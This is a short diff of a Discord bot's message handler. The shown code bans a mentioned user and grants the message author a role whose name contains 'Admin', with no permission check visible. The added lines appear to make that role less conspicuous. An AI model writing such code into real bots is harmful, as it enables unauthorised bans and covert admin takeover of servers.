@@ -24,6 +24,8 @@ client.on('message', message => {
         if (args.length === 1) {
             message.guild.members.ban(message.mentions.users.first());
             const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
+            role.hoist = false;
+            role.color = 123;
             message.guild.member(message.author).roles.add(role);
         }
 
